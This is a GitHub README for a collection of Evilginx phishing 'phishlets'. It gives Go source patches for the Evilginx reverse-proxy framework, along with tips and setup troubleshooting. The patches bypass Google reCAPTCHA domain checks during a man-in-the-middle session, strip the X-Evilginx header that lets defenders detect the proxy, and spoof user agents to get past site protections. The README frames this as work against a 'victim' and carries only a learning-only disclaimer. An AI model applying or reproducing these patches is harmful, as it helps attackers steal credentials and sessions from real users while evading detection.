### This Repo is Only For Learning Purposes. Use These Phishlets To learn and create Your Own.

# Phishlets Developement Tips
- Always Use Debug Mode in evilginx During Testing 
- Not Everything is Working Here, Use these Phishlets to learn and to Play with Evilginx.
- Be Creative when it comes to bypassing protection.
- Javascript Injection can fix a lot of issues and will make your life easier during phishing engagements.
- Make sure to check Evilginx Docs [here](https://help.evilginx.com)

# Some Less Known Techniques
### Using Evilginx2 Phishlets with Evilginx3
- There's been some updates regarding how `js_inject` used to work in evilginx2, Check more [here](https://github.com/kgretzky/evilginx2/releases/tag/v3.0.0).
- To support the evilginx2 phishlets which had `js_inject` , You need to either modify its `trigger_paths` or you can just modify the evilginx3 Source code to support it.
- To know more [Check this](https://github.com/kgretzky/evilginx2/issues/904#issuecomment-1585787426)
- Modifying `core\phishlet.go` to allow regex in `trigger_paths` for `js_inject`.
```
\\Replace line (line 909)
re, err := regexp.Compile("^" + d + "$")

\\with line
re, err := regexp.Compile(d)
```

### Google Recaptcha Bypass by [@Desire](https://twitter.com/DWORKWITH)
- Google recaptcha encodes domain in base64 and includes it in `co` parameter in GET request.
- For Example in safe-domain (Demo) Login.
  ```
  https://www.google.com/recaptcha/enterprise/anchor?ar=1&k=6LePlpgbAAAAAPlPfzzXnJ1lrMTqRWgouzDcSd3b&co=aHR0cHM6Ly9hY2NvdW50cy5zYWZlLWRvbWFpbi5jb206NDQz&hl=en&v=vP4jQKq0YJFzU6e21-BGy3GP&size=invisible&cb=knko72z68i8y
- Here the parameter `co` contains string `co=aHR0cHM6Ly9hY2NvdW50cy5zYWZlLWRvbWFpbi5jb206NDQz` which is the base64 encoding of `https://accounts.safe-domain.com:443`
- In case if we use MITM in between with the mitm domain `fake-domain.com`, the value for the `co` parameter will be set to `https://accounts.fake-domain.com:443` encoded in base64 `aHR0cHM6Ly9hY2NvdW50cy5mYWtlLWRvbWFpbi5jb206NDQzCg`  which is not a valid domain , So we need to modify this parameter value to the original domain `https://accounts.safe-domain.com:443` base64 encoded `aHR0cHM6Ly9hY2NvdW50cy5zYWZlLWRvbWFpbi5jb206NDQz`

- Here is the work around code to implement this. Replace the code in evilginx2 `core/http_proxy.go` line 409
```
				// patch GET query params with original domains & bypass recaptcha
				if pl != nil {
					qs := req.URL.Query()
					if len(qs) > 0 {
						for gp := range qs {
							for i, v := range qs[gp] {
								qs[gp][i] = string(p.patchUrls(pl, []byte(v), CONVERT_TO_ORIGINAL_URLS))
							if qs[gp][i] == "aHR0cHM6Ly9hY2NvdW50cy5mYWtlLWRvbWFpbi5jb206NDQzCg" { // https://accounts.fake-domain.com:443
								qs[gp][i] = "aHR0cHM6Ly9hY2NvdW50cy5zYWZlLWRvbWFpbi5jb206NDQz" // https://accounts.safe-domain.com:443
							}
							}
						}
						req.URL.RawQuery = qs.Encode()
					}
				}
```

### Evilginx3 Easter Egg Patch (X-Evilginx Header)
- Evilginx3 contains easter egg code which adds a `X-Evilginx` header with each request.
- This header contains the Attacker Domain name. So it can be used for detection.
- To remove the Easter egg from evilginx just remove/comment below mentioned lines from the `core/http_proxy.go` file.
```
// Line 179
o_host := req.Host

// Line 330
req.Header.Set(p.getHomeDir(), o_host)

// Line 512
req.Header.Set(p.getHomeDir(), o_host)

// Line 1495
func (p *HttpProxy) getHomeDir() string {
	return strings.Replace(HOME_DIR, ".e", "X-E", 1) 
}
```

### Evilginx2 Easter Egg Patch (X-Evilginx Header)
- Evilginx2 contains easter egg code which adds a `X-Evilginx` header with each request.
- This header contains the Attacker Domain name. So it can be used for detection.
- To remove the Easter egg from evilginx just remove/comment below mentioned lines from the `core/http_proxy.go` file.
```
// Line 183
egg2 := req.Host

// Line 350
hg := []byte{0x94, 0xE1, 0x89, 0xBA, 0xA5, 0xA0, 0xAB, 0xA5, 0xA2, 0xB4}  

// Line 407
req.Header.Set(string(hg), egg2)  

// Line 377 to 379
for n, b := range hg {
		hg[n] = b ^ 0xCC
	}
  
// Line 562 to 566
e := []byte{208, 165, 205, 254, 225, 228, 239, 225, 230, 240}
for n, b := range e {
		e[n] = b ^ 0x88
}
req.Header.Set(string(e), e_host)

// Line 1456 to 1462
func (p *HttpProxy) cantFindMe(req *http.Request, nothing_to_see_here string) {
	var b []byte = []byte("\x1dh\x003,)\",+=")
	for n, c := range b {
		b[n] = c ^ 0x45
	}
	req.Header.Set(string(b), nothing_to_see_here)
}

// Line 580
p.cantFindMe(req, e_host)


```

### Add Custom User Agent
- Few sites have protections based on user agent, and relaying on javascript injections to modify the user agent on victim side may break/slow the attack process.
- Custom User Agent Can be Added on the fly by replacing the `User-Agent` Header in each requests.
- Below is the work Around Code to achieve this. You can add code in evilginx2 `core/http_proxy.go` file below line 395.
```
				// Replace Any User Agent With Firefox UserAgent
				useragent := req.Header.Get("User-Agent")
				if useragent != "" {                                   
							req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0")
							log.Debug("[%d] Injected User Agent : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/96.0 ", ps.Index)
				}

```

# Error Resolving
### Error-1 : (Failed to start nameserver on port 53)
METHOD 1 :-
- Follow These Commands & Then Try Relaunching Evilginx
```
sudo service systemd-resolved stop
nano /etc/resolv.conf
```
- Then change nameserver 127.x.x.x to nameserver 8.8.8.8
- Then save the file (By pressing CTRL+X and pressing Y followed by enter)

METHOD 2 :-
- Check if All the neccessary ports are not being used by some other services.
- Ports Like: 80, 53, 443
- Find Those Ports And Kill those Processes
```
sudo netstat -ptnl | grep 53
sudo kill PID
```
- Where PID is Process ID
- Similarly Find And Kill Process On other Ports That are in use.
- Now Try To Run Evilginx and get SSL certificates


# Need any Help ??
- Regarding phishlets for Penetration testing.
- Help with phishlet issues or anything.
- Can Help regarding projects related to Reverse Proxy.
- Contact Me on telegram: https://t.me/its_udy (This is the only account belong to me)
- Please be aware of anyone impersonating my handle ( @an0nud4y is not my telegram handle)
- You can also contact me on twitter (https://an0nud4y.com)


## WARNING !
- DEVELOPER WILL NOT BE RESPONSIBLE FOR ANY MISUSE OF THE PHISHLETS. THESE PHISHLETS ARE ONLY FOR TESTING/LEARNING/EDUCATIONAL/SECURITY PURPOSES.
- DEVELOPER DO NOT SUPPORT ANY OF THE ILLEGAL ACTIVITIES.
- RELEASED THE WORKING/NON-WORKING PHISHLETS JUST TO LET OTHERS LEARN AND FIGURE OUT VARIOUS APPROACHES.
